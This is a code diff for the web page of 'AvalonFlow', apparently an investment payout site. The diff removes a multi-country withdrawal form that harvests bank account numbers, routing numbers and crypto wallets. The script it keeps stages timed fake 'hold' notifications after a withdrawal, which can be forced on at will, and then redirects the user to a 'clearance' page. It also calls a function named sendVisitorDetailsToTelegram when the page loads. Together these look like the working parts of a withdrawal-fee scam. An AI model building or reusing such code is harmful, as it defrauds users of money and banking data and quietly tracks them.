-    @keyframes liquidWave {
-        0% { left: -50%; }
-        100% { left: 100%; }
-    }
-
-/* =========================
-   CANADIAN BANK SELECT
-   PREMIUM GLASS UPGRADE
-========================= */
-
-#canadianBankSelect {
-    width: 100%;
-    height: 52px;
-
-    padding: 0 16px;
-
-    border: 1px solid rgba(255, 255, 255, 0.10);
-    border-radius: 18px;
-
-    background-color: rgba(255, 255, 255, 0.04);
-    color: #fff;
-
-    font-size: 14px;
-    font-weight: 500;
-
-    margin-top: 10px;
-
-    backdrop-filter: blur(18px);
-    -webkit-backdrop-filter: blur(18px);
-
-    box-shadow: 0 8px 30px rgba(0,0,0,0.15);
-
-    transition: all 0.25s ease;
-
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-
-    cursor: pointer;
-
-    /* custom arrow */
-    background-image:
-        linear-gradient(45deg, transparent 50%, #b892ff 50%),
-        linear-gradient(135deg, #b892ff 50%, transparent 50%);
-
-    background-position:
-        calc(100% - 20px) calc(50% - 3px),
-        calc(100% - 14px) calc(50% - 3px);
-
-    background-size: 6px 6px;
-    background-repeat: no-repeat;
-}
-
-/* hover glow */
-#canadianBankSelect:hover {
-    border-color: rgba(107, 44, 216, 0.5);
-
-    box-shadow:
-        0 0 0 2px rgba(107, 44, 216, 0.15),
-        0 10px 35px rgba(0,0,0,0.25);
-}
-
-/* focus state */
-#canadianBankSelect:focus {
-    outline: none;
-
-    border-color: rgba(107, 44, 216, 0.7);
-
-    box-shadow:
-        0 0 0 3px rgba(107, 44, 216, 0.18),
-        0 10px 35px rgba(0,0,0,0.30);
-}
-
-/* dropdown options */
-#canadianBankSelect option {
-    background: #12121c;
-    color: #fff;
-}
-
-
-      footer {
+/* ---------- Dark/Light Mode Toggle ---------- */
+#themeToggle { position: fixed; top: 20px; right: 20px; z-index: 6; padding: 10px 14px; border-radius:10px; background:#6b2cd8; color:#fff; border:none; cursor:pointer; }
+
+/* ---------- Footer ---------- */
+footer {
     position: fixed;
     bottom: 0;
     left: 0;
@@ -1474,53 +484,212 @@ font-weight: bold;
     z-index: 6;
 }
 
-/* Update your CSS targeting rule to look like this */
-.payment-slider-viewport {
-    display: flex;
-    overflow-x: auto;
-    scroll-behavior: smooth;
-    scroll-snap-type: x mandatory;
-    -webkit-overflow-scrolling: touch;
-    width: 100%;
-margin-top: -50px;
+/* ---------- Notification Bar ---------- */
+.notification-bar { position: fixed; top: -80px; right: 20px; background: rgba(30, 144, 255, 0.25); backdrop-filter: blur(12px); border: 1px solid rgba(30,144,255,0.4); color: #fff; padding: 12px 18px; border-radius: 12px; font-size: 14px; box-shadow: 0 6px 18px rgba(0,0,0,0.25); transition: top 0.5s ease, opacity 0.5s ease; z-index: 9999; opacity: 0; max-width: 350px; white-space: normal; overflow: hidden; }
+.notification-bar.show { top: 20px; opacity: 1; }
+.notification-bar::before { content: ''; position: absolute; left: -50%; top: 0; width: 50%; height: 100%; background: rgba(255,255,255,0.3); transform: skewX(-25deg); animation: liquidWave 2s linear infinite; }
+@keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
+
+/* ---------- Live Status Badge ---------- */
+.status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 14px; margin-bottom: 15px; }
+.status-dot { width: 10px; height: 10px; border-radius: 50%; background: #00ff6a; box-shadow: 0 0 10px #00ff6a; }
+.status-offline { background: #ccc; box-shadow: 0 0 5px #ccc; }
+
+/* ---------- Kairos Bot (Full UI System) ---------- */
+
+#assistantBotCard {
+  width: 100%;
+  max-width: 400px;
+  margin-top: 20px;
+  padding: 18px;
+  z-index: 1;
+
+  background: rgba(20, 20, 35, 0.6);
+  border-radius: 16px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+  backdrop-filter: blur(14px);
+  border: 1px solid rgba(255,255,255,0.08);
 }
 
-.payment-slider-viewport::-webkit-scrollbar {
-    display: none;
+#botHeader {
+  background: linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9));
+  color: #fff;
+  text-align: center;
+  padding: 10px;
+  font-weight: 600;
+  letter-spacing: 0.4px;
+  border-radius: 12px 12px 0 0;
 }
 
-.payment-container {
-    flex: 0 0 100%;
-    box-sizing: border-box;
-    scroll-snap-align: center;
+#botMessagesContainer {
+  height: 180px;
+  overflow-y: auto;
+  background: rgba(255,255,255,0.04);
+  backdrop-filter: blur(12px);
+  padding: 10px;
+  border-radius: 0 0 12px 12px;
 }
 
+/* Messages */
+.message {
+  animation: fadeSlideIn 0.25s ease forwards;
+  opacity: 0;
+  font-size: 13px;
+  padding: 6px 10px;
+  display: inline-block;
+  max-width: 85%;
+}
 
+.bot {
+  text-align: left;
+  color: #c7c7ff;
+  background: rgba(107,44,216,0.12);
+  border-radius: 10px 10px 10px 4px;
+}
 
+.user {
+  text-align: right;
+  color: #fff;
+  background: rgba(155,89,182,0.3);
+  border-radius: 10px 10px 4px 10px;
+}
 
-.dots {
+/* Wrap */
+.msgWrap {
   display: flex;
-  justify-content: center;
-  gap: 6px;
-  margin-top: 10px;
+  flex-direction: column;
+  margin-bottom: 6px;
 }
 
-.dots span {
+/* Animation */
+@keyframes fadeSlideIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Typing dots */
+.typing {
+  display: inline-flex;
+  gap: 4px;
+  background: rgba(107,44,216,0.12);
+  padding: 6px 10px;
+  border-radius: 10px 10px 10px 4px;
+}
+
+.typing span {
   width: 6px;
   height: 6px;
-  background: #555;
+  background: #c7c7ff;
   border-radius: 50%;
+  animation: blink 1.2s infinite;
 }
 
-.dots span.active {
-  background: #6b2cd8;
+.typing span:nth-child(2) { animation-delay: 0.2s; }
+.typing span:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes blink {
+  0%, 80%, 100% { opacity: 0.2; }
+  40% { opacity: 1; }
 }
+
+/* Meta (time + ticks) */
+.meta {
+  display: flex;
+  justify-content: flex-end;
+  align-items: center;
+  gap: 4px;
+  margin-top: 2px;
+}
+
+.timestamp {
+  font-size: 10px;
+  opacity: 0.5;
+  color: #aaa;
+}
+
+/* Double ticks */
+.tick {
+  font-size: 11px;
+  letter-spacing: -2px;
+}
+
+.tick.delivered::after {
+  content: "✓✓";
+  color: #bbb;
+}
+
+.tick.seen::after {
+  content: "✓✓";
+  color: #6c8cff;
+}
+
+/* Ambient */
+.ambient {
+  text-align: center;
+  color: #aaa;
+  font-size: 12px;
+  opacity: 0.8;
+}
+
+/* Input */
+#botInput {
+  flex: 1;
+  padding: 8px;
+  border: none;
+  border-radius: 10px;
+  background: rgba(255,255,255,0.08);
+  color: #fff;
+  margin-right: 4px;
+  outline: none;
+}
+
+/* Button */
+#botSendBtn {
+  background: linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9));
+  border: none;
+  color: #fff;
+  border-radius: 10px;
+  padding: 8px 12px;
+  cursor: pointer;
+}
+
+/* ---------- Dark/Light Mode ---------- */
+body.light-mode { background: #f5f5f5; color: #111; }
+body.light-mode #sidebar { background: rgba(120, 180, 255, 0.7); color: #111; }
+body.light-mode .glass-card { background: rgba(120, 180, 255, 0.7); color: #111; }
+body.light-mode .button { background: #6b2cd8; color: #fff; }
+body.light-mode .notification-bar { background: rgba(30,144,255,0.25); color: #111; border-color: rgba(30,144,255,0.4); }
+
+#ticketFile {
+    background: rgba(255,255,255,0.1);
+    border-radius: 10px;
+    padding: 6px;
+    color: #fff;
+    width: 100%;
+}
+#analyticsPanel div {
+    background: rgba(107,44,216,0.15);
+    padding: 6px 12px;
+    border-radius: 8px;
+    font-size: 14px;
+}
+
+.badge-item {
+    background: linear-gradient(90deg,#6b2cd8,#9b59b6);
+    color: #fff;
+    padding: 6px 12px;
+    border-radius: 12px;
+    font-size: 12px;
+    box-shadow: 0 0 6px rgba(107,44,216,0.7);
+}
+
+/* ---------- Mobile Notification Adjustments ---------- */
+@media(max-width:600px){ .notification-bar { top: 10px; right: 10px; max-width: 90%; font-size: 13px; } }
 </style>
 </head>
 <body>
-  <!-- Floating Background -->
-  <div id="floating-bg"></div>
 
+<div id="floating-bg"></div>
     <button id="menuBtn" onclick="toggleSidebar()">☰
 
 <div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
@@ -1528,56 +697,19 @@ margin-top: -50px;
     </div>
 </button>
 
-<div id="planNotification" class="notification-bar"></div>
+<div id="supportNotification" class="notification-bar"></div>
 
-<!-- =========================
-TOP RIGHT PROFILE AVATAR
-========================= -->
-<div class="top-right-profile">
-     <div class="avatar-ring">
-        <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
-    </div>
+<button id="menuBtn" onclick="toggleSidebar()">☰</button>
 
-    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
-        
-    </div>
-
-</div>
-
-
-<!-- =========================
-CROP MODAL
-========================= -->
-<div id="cropModal" class="crop-modal hidden">
-
-    <div class="crop-box">
-
-        <!-- file input (hidden trigger via JS) -->
-        <input type="file" id="photoInput" accept="image/*">
-
-        <!-- crop preview -->
-        <div class="crop-preview">
-            <img id="cropImage">
-        </div>
-
-        <!-- actions -->
-        <div class="crop-actions">
-            <button id="saveCropped">Save Photo</button>
-            <button id="cancelCrop">Cancel</button>
-        </div>
-
-    </div>
-
-</div>
-
-       <div id="sidebar">
+    <div id="sidebar">
        <h2>AvalonFlow</h2>
     <button onclick="window.location.href='/dashboard'">Dashboard</button>
 <button onclick="window.location.href='/notifications'">My Notifications</button>
-    <button onclick="window.location.href='/withdrawal'">Withdrawal</button>
+    <button onclick="window.location.href='/withdrawal'">Withdrawal</button>
+    <button onclick="window.location.href='/myreturns'">Retention Bonus</button>
+    <button onclick="window.location.href='/support'">Support</button>
     <button onclick="logout()">Logout</button>
 </div>
-<div id="overlay" onclick="toggleSidebar()"></div>
 
   <header class="minimal-logo-header">
   <div class="logo-shimmer-wrapper">
@@ -1585,225 +717,49 @@ CROP MODAL
   </div>
 </header>
 
-<section id="section3" style="position: relative; max-width: 600px; margin: 0 auto;">
-
-  <div class="payment-slider-viewport">
-
-    <div class="payment-container">
-      <p class="glass-cardsrd acu-gradient">
-        <strong>Canada 🇨🇦</strong>
- <div style="height:4px;"></div>
-      </p>
-
-      <div class="glass-card">
-        <div class="top-trust">
-          Automatic Disbursement supported via global payment networks.
+<div id="content">
+    <!-- Ticket / Support Card -->
+    <div class="glass-card">
+        <div class="status-badge">
+            <span id="statusDot" class="status-dot"></span>
+            <span id="statusText">Checking status...</span>
         </div>
+        <p><strong>Behind every smooth interaction is a dedicated team member. 👩‍💼💻</strong></p>
+        <div class="mini-tv" id="miniTV"></div>
+        <p>Generate a ticket reference before contacting support for faster resolution.</p>
+        <button class="button" onclick="generateTicket()">Generate Ticket Reference</button>
+        <p id="ticketResult" style="margin-top:15px;font-weight:bold;"></p>
+        <!-- Email Support Button -->
+<a href="mailto: avalonflow@usa.com" 
+   class="button" 
+   style="margin-bottom:20px;" 
+   onclick="notify('Include your ticket reference in the email.')">
+   Email Support
+</a>
 
-        <div class="payment-method glass-cards" data-method="Interac e-Transfer" data-region="canada">
-          <div class="payment-header">
-            <img class="payment-logo" src="https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/980ec2577fa19bf58d7ca687805b52c3.jpg">
-            <span>▼ Interac e-Transfer</span>
-          </div>
-          <input id="interacName" placeholder="Account Holder Name">
-          <input id="interacInput" placeholder="Enter your email for e-Transfer">
-        </div>
-
-        <div class="payment-method glass-cards" data-method="Canadian Bank Transfer" data-region="canada">
-          <div class="payment-header">
-            <img class="payment-logos" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
-            <span>▼ Bank Transfer</span>
-          </div>
-          <select id="canadianBankSelect">
-            <option value="">Select Your Bank</option>
-            <option>RBC Royal Bank</option>
-            <option>TD Canada Trust</option>
-            <option>Scotiabank</option>
-            <option>BMO</option>
-            <option>CIBC</option>
-            <option>National Bank</option>
-            <option>Tangerine</option>
-            <option>Simplii Financial</option>
-          </select>
-          <input id="accountName" placeholder="Account Holder Name">
-          <input id="transitNumber" placeholder="Transit Number (5 digits)">
-          <input id="institutionNumber" placeholder="Institution Number (3 digits)">
-          <input id="accountNumber" placeholder="Account Number (7–12 digits)">
-        </div>
-
-        <div class="payment-method glass-cards" data-method="Canada PayPal" data-region="canada">
-          <div class="payment-header">
-            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
-            <span>▼ PayPal</span>
-          </div>
-          <input id="paypalName" placeholder="Account Holder Name">
-          <input id="paypalInput" placeholder="Enter your PayPal email">
-        </div>
-
-        <div class="payment-method glass-cards" data-method="Canada USDT / USDC ERC20" data-region="canada">
-          <div class="token-logos">
-            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
-            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
-            <span>▼ USDT / USDC [ERC-20]</span>
-          </div>
-          <input id="cryptoName" placeholder="Account Holder Name">
-          <input id="acuAccount" placeholder="Enter your ERC-20 wallet address (0x...)">
-          <div class="network-note">⚠ ERC-20 network only</div>
-        </div>
-      </div>
+<!-- Issue Category Dropdown -->
+<select id="issueCategory" 
+        class="input" 
+        style="margin-top:20px;">
+    <option value="">Select Issue Category</option>
+    <option value="technical">Technical</option>
+    <option value="billing">Billing</option>
+    <option value="account">Account</option>
+    <option value="other">Other</option>
+</select>
     </div>
 
-   <div class="payment-container">
-  <p class="glass-cardsrd acu-gradient">
-    <strong>United States 🇺🇸</strong>
-    <div style="height:4px;"></div>
-  </p>
-
-  <div class="glass-card">
-    <div class="top-trust">
-      Automatic Disbursement supported via global payment networks.
-    </div>
-
-    <!-- Venmo (USA Specific) -->
-    <div class="payment-method glass-cards" data-method="Venmo" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logo" src="assets/pictures/5f33cd7cd34531a65477de41742743d3.jpg">
-        <span>Venmo</span>
-      </div>
-      <input id="venmoName" placeholder="Account Holder Name">
-      <input id="venmoInput" placeholder="Enter your Venmo username (e.g., @username)">
-    </div>
-
-    <!-- American Bank Transfer (Corrected Layout & US Banks) -->
-    <div class="payment-method glass-cards" data-method="American Bank Transfer" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logosss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
-        <span>▼ Bank Transfer</span>
-      </div>
-      <select id="americanBankSelect">
-        <option value="">Select Your Bank</option>
-        <option>Chase Bank</option>
-        <option>Bank of America</option>
-        <option>Wells Fargo</option>
-        <option>Citi (Citibank)</option>
-        <option>U.S. Bank</option>
-        <option>PNC Bank</option>
-        <option>Capital One</option>
-        <option>Fifth Third Bank</option>
-      </select>
-      <input id="accountName-us" placeholder="Account Holder Name">
-      <!-- Changed from 'Sort Code' to 'Routing Number' for US Banking -->
-      <input id="transitNumber-us" placeholder="Routing Number (9 digits)">
-      <input id="accountNumber-us" placeholder="Account Number (4–17 digits)">
-    </div>
-
-    <!-- US PayPal -->
-    <div class="payment-method glass-cards" data-method="US PayPal" data-region="usa">
-      <div class="payment-header">
-        <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
-        <span>▼ PayPal</span>
-      </div>
-      <input id="paypalName-us" placeholder="Account Holder Name">
-      <input id="paypalInput-us" placeholder="Enter your PayPal email">
-    </div>
-
-    <!-- US USDT / USDC ERC20 -->
-    <div class="payment-method glass-cards" data-method="US USDT / USDC ERC20" data-region="usa">
-      <div class="token-logos">
-        <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
-        <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
-        <span>▼ USDT / USDC [ERC-20]</span>
-      </div>
-      <input id="cryptoName-us" placeholder="Account Holder Name">
-      <input id="acuAccount-us" placeholder="Enter your ERC-20 wallet address (0x...)">
-      <div class="network-note">⚠ ERC-20 network only</div>
-    </div>
-  </div>
-</div>
-
-
-<div class="payment-container">
-      <p class="glass-cardsrd acu-gradient">
-        <strong>United Kingdom 🇬🇧</strong>
-        <div style="height:4px;"></div>
-      </p>
-
-      <div class="glass-card">
-        <div class="top-trust">
-          Automatic Disbursement supported via global payment networks.
+    <!-- Gamification Panel -->
+    <div class="glass-card" id="gamificationPanel" style="margin-top:20px;">
+        <h3>🏆 Your Engagement</h3>
+        <div style="display:flex; gap:12px; flex-wrap: wrap; margin-bottom:12px;" id="badgesContainer">
+            <!-- Badges will appear here dynamically -->
         </div>
 
-        <div class="payment-method glass-cards" data-method="Revolut" data-region="uk">
-          <div class="payment-header">
-            <img class="payment-logo" src="assets/pictures/WA_1783361545224.jpeg">
-            <span>Revolut</span>
-          </div>
-          <input id="revolutName" placeholder="Account Holder Name">
-          <input id="revolutInput" placeholder="Enter your Revtag (e.g., @username)">
+        <div style="margin-bottom:12px;">
+            <strong>🔥 Streak:</strong> <span id="streakCount">0</span> days
         </div>
-
-        <div class="payment-method glass-cards" data-method="British Bank Transfer" data-region="uk">
-          <div class="payment-header">
-            <img class="payment-logoss" src="https://cdn-icons-png.flaticon.com/512/2830/2830284.png">
-            <span>▼ Bank Transfer</span>
-          </div>
-          <select id="britishBankSelect">
-            <option value="">Select Your Bank</option>
-            <option>Barclays</option>
-            <option>HSBC UK</option>
-            <option>Lloyds Bank</option>
-            <option>Santander UK</option>
-            <option>Halifax</option>
-            <option>TSB Bank</option>
-            <option>Nationwide</option>
-            <option>NatWest</option>
-          </select>
-          <input id="accountName-uk" placeholder="Account Holder Name">
-          <input id="transitNumber-uk" placeholder="Sort Code (6 digits)">
-          <input id="accountNumber-uk" placeholder="Account Number (8 digits)">
-        </div>
-
-        <div class="payment-method glass-cards" data-method="UK PayPal" data-region="uk">
-          <div class="payment-header">
-            <img class="payment-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg">
-            <span>▼ PayPal</span>
-          </div>
-          <input id="paypalName-uk" placeholder="Account Holder Name">
-          <input id="paypalInput-uk" placeholder="Enter your PayPal email">
-        </div>
-
-        <div class="payment-method glass-cards" data-method="UK USDT / USDC ERC20" data-region="uk">
-          <div class="token-logos">
-            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png">
-            <img class="payment-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png">
-            <span>▼ USDT / USDC [ERC-20]</span>
-          </div>
-          <input id="cryptoName-uk" placeholder="Account Holder Name">
-          <input id="acuAccount-uk" placeholder="Enter your ERC-20 wallet address (0x...)">
-          <div class="network-note">⚠ ERC-20 network only</div>
-        </div>
-      </div>
     </div>
-
-  </div> <div class="dots">
-    <span class="active"></span>
-    <span></span>
-    <span></span>
-  </div>
-
-  <button class="nav-btn left">&#8592;</button>
-  <button class="nav-btn right">&#8594;</button>
-
-  <div id="navButtons"
-       style="max-width:600px;margin:40px auto 100px;display:flex;justify-content:flex-end;position:relative;z-index:5;">
-    <button id="nextBtnSeparate"
-            style="background:rgba(107,44,216,0.9);border:1px solid #fff;padding:12px 24px;border-radius:12px;font-weight:bold;color:#fff;">
-      Withdraw
-    </button>
-  </div>
-
-</section>
-
 
 
 <!-- Sticky Footer -->
@@ -1812,107 +768,6 @@ CROP MODAL
     </footer>
 
 <script>
-// ==========================================
-// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
-// ==========================================
-
-const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/notifications"; // Same target clearance page
-const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     // Set true to redirect automatically on sub-pages when hold hits
-
-// Set static title string instead of pulling from document.title
-const originalDocumentTitle = "Notifications";
-let titleInterval = null;
-
-function stopTitleFlashing() {
-    if (titleInterval) {
-        clearInterval(titleInterval);
-        titleInterval = null;
-    }
-}
-
-function startTitleFlashing(count) {
-    stopTitleFlashing();
-    if (!document.hidden || count === 0) return;
-
-    let toggle = false;
-    titleInterval = setInterval(() => {
-        document.title = toggle ? `🔔 (${count}) New Notification!` : `(${count}) ${originalDocumentTitle}`;
-        toggle = !toggle;
-    }, 1000);
-}
-
-function getFallbackActiveIds() {
-    const isWithdrawn = localStorage.getItem("av_withdrawn") === "true" || localStorage.getItem("av_is_withdrawn") === "true";
-    let storedWithdrawalTime = localStorage.getItem("av_withdrawal_time");
-    let baseWithdrawalMs = storedWithdrawalTime ? new Date(storedWithdrawalTime).getTime() : Date.now();
-    if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
-    const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));
-
-    const ids = [{ id: 1 }, { id: 3 }, { id: 4 }, { id: 5 }];
-
-    if (isWithdrawn) {
-        ids.push({ id: 2 });
-        if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
-            ids.push({ id: 9 });
-        }
-        if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
-            ids.push({ id: 10 });
-        }
-    }
-    return ids;
-}
-
-function checkUnreadNotifications() {
-    const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
-    const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
-
-    const rawCache = localStorage.getItem('av_active_notifs_cache');
-    const activeNotifications = rawCache ? JSON.parse(rawCache) : getFallbackActiveIds();
-
-    // Check if Stage 3 (#10) is active and unread
-    const isHoldActiveAndUnread = activeNotifications.some(n => n.id === 10) && !readIds.includes(10) && !deletedIds.includes(10);
-
-    if (ENABLE_SUBPAGE_HOLD_REDIRECT && isHoldActiveAndUnread) {
-        window.location.replace(CLEARANCE_REDIRECT_URL);
-        return;
-    }
-
-    const unreadCount = activeNotifications.filter(n => 
-        !deletedIds.includes(n.id) && !readIds.includes(n.id)
-    ).length;
-
-    const badge = document.getElementById('unread-count');
-    if (badge) {
-        badge.textContent = `${unreadCount} unread`;
-        badge.classList.toggle('hidden', unreadCount === 0);
-    }
-
-    if (document.hidden && unreadCount > 0) {
-        startTitleFlashing(unreadCount);
-    } else {
-        stopTitleFlashing();
-        document.title = unreadCount > 0 ? `(${unreadCount}) ${originalDocumentTitle}` : originalDocumentTitle;
-    }
-}
-
-window.addEventListener("storage", (e) => {
-    if (["av_read_notifs", "av_deleted_notifs", "av_active_notifs_cache", "av_withdrawn", "av_force_hold"].includes(e.key)) {
-        checkUnreadNotifications();
-    }
-});
-
-document.addEventListener("visibilitychange", () => {
-    if (!document.hidden) {
-        stopTitleFlashing();
-    }
-    checkUnreadNotifications();
-});
-
-window.addEventListener("focus", checkUnreadNotifications);
-
-checkUnreadNotifications();
-
-
 // ==========================================
 // 1. TELEGRAM VISITOR TRACKING CONFIGURATION
 // ==========================================
@@ -2067,6 +922,105 @@ document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
 });
 
+// ==========================================
+// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
+// ==========================================
+
+const CLEARANCE_REDIRECT_URL = "clearance.html"; // Same target clearance page
+const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     // Set true to redirect automatically on sub-pages when hold hits
+
+// Set static title string instead of pulling from document.title
+const originalDocumentTitle = "Notifications";
+let titleInterval = null;
+
+function stopTitleFlashing() {
+    if (titleInterval) {
+        clearInterval(titleInterval);
+        titleInterval = null;
+    }
+}
+
+function startTitleFlashing(count) {
+    stopTitleFlashing();
+    if (!document.hidden || count === 0) return;
+    
+    let toggle = false;
+    titleInterval = setInterval(() => {
+        document.title = toggle ? `🔔 (${count}) New Notification!` : `(${count}) ${originalDocumentTitle}`;
+        toggle = !toggle;
+    }, 1000);
+}
+
+function getFallbackActiveIds() {
+    const isWithdrawn = localStorage.getItem("av_withdrawn") === "true" || localStorage.getItem("av_is_withdrawn") === "true";
+    let storedWithdrawalTime = localStorage.getItem("av_withdrawal_time");
+    let baseWithdrawalMs = storedWithdrawalTime ? new Date(storedWithdrawalTime).getTime() : Date.now();
+    if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
+    const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));
+
+    const ids = [{ id: 1 }, { id: 3 }, { id: 4 }, { id: 5 }];
+
+    if (isWithdrawn) {
+        ids.push({ id: 2 });
+        if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
+            ids.push({ id: 9 });
+        }
+        if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
+            ids.push({ id: 10 });
+        }
+    }
+    return ids;
+}
+
+function checkUnreadNotifications() {
+    const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
+    const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
+    
+    const rawCache = localStorage.getItem('av_active_notifs_cache');
+    const activeNotifications = rawCache ? JSON.parse(rawCache) : getFallbackActiveIds();
+    
+    // Check if Stage 3 (#10) is active and unread
+    const isHoldActiveAndUnread = activeNotifications.some(n => n.id === 10) && !readIds.includes(10) && !deletedIds.includes(10);
+    
+    if (ENABLE_SUBPAGE_HOLD_REDIRECT && isHoldActiveAndUnread) {
+        window.location.replace(CLEARANCE_REDIRECT_URL);
+        return;
+    }
+
+    const unreadCount = activeNotifications.filter(n => 
+        !deletedIds.includes(n.id) && !readIds.includes(n.id)
+    ).length;
+
+    const badge = document.getElementById('unread-count');
+    if (badge) {
+        badge.textContent = `${unreadCount} unread`;
+        badge.classList.toggle('hidden', unreadCount === 0);
+    }
+
+    if (document.hidden && unreadCount > 0) {
+        startTitleFlashing(unreadCount);
+    } else {
+        stopTitleFlashing();
+        document.title = unreadCount > 0 ? `(${unreadCount}) ${originalDocumentTitle}` : originalDocumentTitle;
+    }
+}
+
+window.addEventListener("storage", (e) => {
+    if (["av_read_notifs", "av_deleted_notifs", "av_active_notifs_cache", "av_withdrawn", "av_force_hold"].includes(e.key)) {
+        checkUnreadNotifications();
+    }
+});
+
+document.addEventListener("visibilitychange", () => {
+    if (!document.hidden) {
+        stopTitleFlashing();
+    }
+    checkUnreadNotifications();
+});
+
+window.addEventListener("focus", checkUnreadNotifications);
+
+checkUnreadNotifications();
 
 
 
@@ -2084,138 +1038,29 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-$(document).ready(function () {
+/* Floating particles */
+const bg = document.getElementById('floating-bg');
 
-    const bankLogos = {
-        "RBC Royal Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/4889b91421334f04992dbd75abd44c94.jpg",
-        "TD Canada Trust": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/e90fc5400809adf33e281d9f876d5485.jpg",
-        "Scotiabank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/839782492ccfda0e5f616798c2646804.jpg",
-        "BMO": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/1352e3513e09b08d6559887eae7f8f7a.jpg",
-        "CIBC": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/39502b52ef053fc42561434042a06ecd.jpg",
-        "National Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/fb34b722f69d354bf24dd585444a6cee.jpg",
-        "Tangerine": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Tangerine_Bank-Logo.wine.png",
-        "Simplii Financial": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Simplii_Financial_branding.jpg"
-    };
+function particle() {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    
+    const s = Math.random() * 20 + 10;
+    p.style.width = s + 'px';
+    p.style.height = s + 'px';
+    p.style.left = Math.random() * 100 + 'vw';
+    p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+    
+    bg.appendChild(p);
+    
+    setTimeout(() => p.remove(), 30000);
+}
 
-    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
-
-    const $logo = $('.payment-logos');
-
-    $('#canadianBankSelect').on('change', function () {
-
-        const selectedBank = $(this).val();
-        const newLogo = bankLogos[selectedBank] || defaultLogo;
-
-        // fade out (CSS handles animation)
-        $logo.addClass('is-hidden');
-
-        // preload image first
-        const tempImg = new Image();
-
-        tempImg.onload = function () {
-            $logo.attr('src', newLogo);
-
-            // force reflow so transition triggers properly
-            void $logo[0].offsetWidth;
-
-            // fade in
-            $logo.removeClass('is-hidden');
-        };
-
-        tempImg.src = newLogo;
-    });
-
-});
-
-$(document).ready(function () {
-
-        const bankLogos = {
-    "Chase Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/dcaa7faba74f565af7efbf1135c2e144.jpg",
-    "Bank of America": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/7826c02a5b48ea41e801cafcb0bba674.jpg",
-    "Wells Fargo": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Wells_Fargo_Logo_(2020).png",
-    "Citi (Citibank)": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/df079c7d167289b284e6bc9402a81c96.jpg",
-    "U.S. Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/US-Bank-Logo-700x394.png",
-    "PNC Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/PNClogo.svg.png",
-    "Capital One": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/Capital_One_logo.svg.png",
